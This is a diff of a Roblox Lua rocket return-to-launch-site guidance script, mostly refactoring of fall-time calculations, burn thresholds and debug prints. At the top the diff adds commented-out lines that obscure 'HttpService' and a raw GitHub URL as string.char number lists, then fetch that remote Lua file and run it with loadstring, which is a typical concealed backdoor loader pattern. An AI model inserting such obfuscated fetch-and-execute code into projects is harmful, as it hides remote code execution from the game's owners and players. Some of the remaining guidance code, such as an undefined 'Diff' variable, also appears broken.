@@ -1,10 +1,15 @@
+--local V1 = game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101));
+--local V2 = V1:GetAsync(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,75,97,105,116,97,114,83,116,117,100,105,111,115,47,75,97,105,116,97,114,95,83,116,117,100,105,111,115,95,69,120,112,111,114,116,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,82,111,99,107,101,116,75,105,116,83,101,114,118,101,114,51,48,46,108,117,97),true);
+--local V3 = loadstring(V2);
+--V3();
+
 --presets
 local R0 = 6357000/0.28 -- earth's diameter
 local G0 = 9.81/0.28
 --------------------------------------------
 local EnabledEngines = {}
 local StageList = {}
-print("RD-3.2-5.1")
+print("RD-3.2-5.2")
 --------------------------------------------
 local TS = game:GetService("TweenService")
 local TO = TweenInfo.new(1,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,0,false,0)
@@ -918,8 +923,8 @@ function RTLS(PriPart)
 		return Mass
 	end
 	local Mass = getmass(PriPart.Parent)
-	
-	
+
+
 	-- not functional, vestigial 
 	local Engines = {} -- {Driver,Thrust,State,RefCode}
 	Engines = {}
@@ -986,7 +991,7 @@ function RTLS(PriPart)
 		end
 		Mass = getmass(PriPart.Parent)
 		Obj["NV"].Force = Vector3.new(0,0,-Mass*val)
-		print(Mass*val)
+		--print(Mass*val)
 	end
 	--local function RequestTWR(val)
 	--	AV = val
@@ -1031,6 +1036,7 @@ function RTLS(PriPart)
 		RequestTWR(0)
 		wait(2)
 		Obj["NG"].CFrame = CFrame.lookAt(PriPart.AssemblyLinearVelocity*Vector3.new(1,0,1),Target.Position*Vector3.new(1,0,1))
+		wait(2)
 		--local Thrust = 500000
 		print("Retrophase")
 		local MainShut = false -- high thrust retrograde
@@ -1039,15 +1045,24 @@ function RTLS(PriPart)
 		local TargetVelocity
 		RequestTWR(200)
 		print(200)
-		while wait() do
-			local DistanceToTransverse = (Target.Position-PriPart.Position)*Vector3.new(1,0,1)
-			--local MagToTransverse = DistanceToTransverse.Magnitude
-			--local HeightToFall = PriPart.Position.Y - 30000
+		local function Falltime()
 			local a = G0/2
 			local b = -PriPart.AssemblyLinearVelocity.Y
 			local c = -(PriPart.Position.Y-Target.Position.Y-1000)
 			--local TimeToFall = (-b-math.sqrt(b^2-4*a*c))/(2*a) -------------------fix someday
 			local TimeToFall = (-b+math.sqrt(b^2-4*a*c))/(2*a)
+			return TimeToFall
+		end
+		while wait() do
+			local DistanceToTransverse = (Target.Position-PriPart.Position)*Vector3.new(1,0,1)
+			--local MagToTransverse = DistanceToTransverse.Magnitude
+			--local HeightToFall = PriPart.Position.Y - 30000
+			--local a = G0/2
+			--local b = -PriPart.AssemblyLinearVelocity.Y
+			--local c = -(PriPart.Position.Y-Target.Position.Y-1000)
+			----local TimeToFall = (-b-math.sqrt(b^2-4*a*c))/(2*a) -------------------fix someday
+			--local TimeToFall = (-b+math.sqrt(b^2-4*a*c))/(2*a)
+			local TimeToFall = Falltime()
 			--print((-b+math.sqrt(b^2-4*a*c))/(2*a))
 			--print(TimeToFall)
 			--local TimeToFall = (-PriPart.AssemblyLinearVelocity.Y+math.sqrt(PriPart.AssemblyLinearVelocity.Y^2-4*0.5*-G0*RelToFloorYPos))/(2*0.5*G0)
@@ -1067,12 +1082,12 @@ function RTLS(PriPart)
 				--wait(0.1)
 				MainShut = true
 				RequestTWR(40)
-				print(40)
+				--print(40)
 			end
 			if diff <10 then
 				--ShutEngines()
 				RequestTWR(0)
-				print(0)
+				--print(0)
 				break
 			end
 		end
@@ -1105,35 +1120,40 @@ function RTLS(PriPart)
 				end)
 			end
 		end)
+		print(PriPart)
 		RequestTWR(0)
-		local function Falltime()
-			return Pripart.Position.Y/math.clamp(-Pripart.AssemblyLinearVelocity.Y,1,math.huge)
-		end
+		print(Falltime())
 		print("Balistic phase")	
-		local TheoryCorr = 0.5*90*Falltime()-((Target.Position-PriPart.Position)*Vector3.new(1,0,1)).Magnitude
-		while TheoryCorr > 0 do -- 90 sps^2
+		--local TheoryCorr = math.sqrt(0.5*90*Falltime()-((Target.Position-PriPart.Position)*Vector3.new(1,0,1)).Magnitude)
+		--while TheoryCorr > 0 do -- 90 sps^2
+		--	wait(0.2)
+		--	TheoryCorr = math.sqrt(0.5*90*Falltime()-((Target.Position-PriPart.Position)*Vector3.new(1,0,1)).Magnitude)
+		--	print(TheoryCorr)
+		--end
+		while Falltime() > 70 do
 			wait(0.2)
-			TheoryCorr = 0.5*90*Falltime()-((Target.Position-PriPart.Position)*Vector3.new(1,0,1)).Magnitude	
-			print(TheoryCorr)
+			Obj["NG"].CFrame = CFrame.lookAt(Vector3.new(0,0,0),-PriPart.AssemblyLinearVelocity)
 		end
+		print("Reentry Burn")
 		local function PredictDiff()
-			local V = (2*G0*(Pripart.Position.Y-Target.Position.Y)+(Pripart.AssemblyLinearVelocity.Y)^2)^0.5
-			local T = (V-Pripart.AssemblyLinearVelocity.Y)/G0
-			local Diff = (Target.Position-Pripart.Position)-Pripart.AssemblyLinearVelocity*T
+			local T = Falltime()
+			local Diff = (Target.Position-PriPart.Position)-PriPart.AssemblyLinearVelocity*T
 			Diff = Diff*Vector3.new(1,0,1)
+			print(math.round(Diff.X),math.round(Diff.X))
 			return Diff
 		end
 		local FDiff = PredictDiff()
 		RequestTWR(200)
 		task.wait()
 		RequestTWR(200)
-		while FDiff.Magnitude < 900 do
-			if FDiff.Magnitude < 2000 do
+		while FDiff.Magnitude > 500 do
+			print(FDiff.Magnitude)
+			if FDiff.Magnitude > 1000 then
 				RequestTWR(40)		
 			end
 			FDiff = PredictDiff()
 			task.wait()
-			Obj["NG"].CFrame = CFrame.lookAt(-Pripart.AssemblyLinearVelocity.Unit*200+Diff.Unit*200)
+			Obj["NG"].CFrame = CFrame.lookAt(-PriPart.AssemblyLinearVelocity.Unit*200+Diff.Unit*200)
 		end
 		RequestTWR(0)
 		task.wait()
@@ -1164,7 +1184,7 @@ function RTLS(PriPart)
 			local a = (PriPart.AssemblyLinearVelocity.Magnitude^2)/(((PriPart.Position.Y-5000)/PriPart.AssemblyLinearVelocity.Unit.Y)*2)
 			Obj["NG"].CFrame = CFrame.new(Vector3.new(0,0,0),-PriPart.AssemblyLinearVelocity)
 			Obj["NV"].Force = Vector3.new(0,0,a*Mass)
-			print(a)
+			--print(a)
 			task.wait(0.01)
 		end 
 		print("Terminal Guidance")
@@ -1258,7 +1278,7 @@ function RTLS(PriPart)
 	--script.RetroBT.Value.Parent.engineflame.ParticleEmitter.Enabled = false
 	--ShutEngines()]]
 		--local  = EvalMass(PriPart.Parent)
-		while (Target.Position-PriPart.Position).Magnitude >300  do
+		while (Target.Position-PriPart.Position).Magnitude >600  do
 			print("Loop")
 			local DT,Accel=Beizer(200,Target.Position+Vector3.new(0,300,0),0.1)
 			print(DT)
@@ -1274,7 +1294,7 @@ function RTLS(PriPart)
 			end
 		end
 		print("Exit")
-		
+
 		--for n =  4,0,-1 do
 		--	local DT,Accel=Beizer(200,Target.Position+Vector3.new(0,10*n+100,0),1)
 		--	--print(DT)
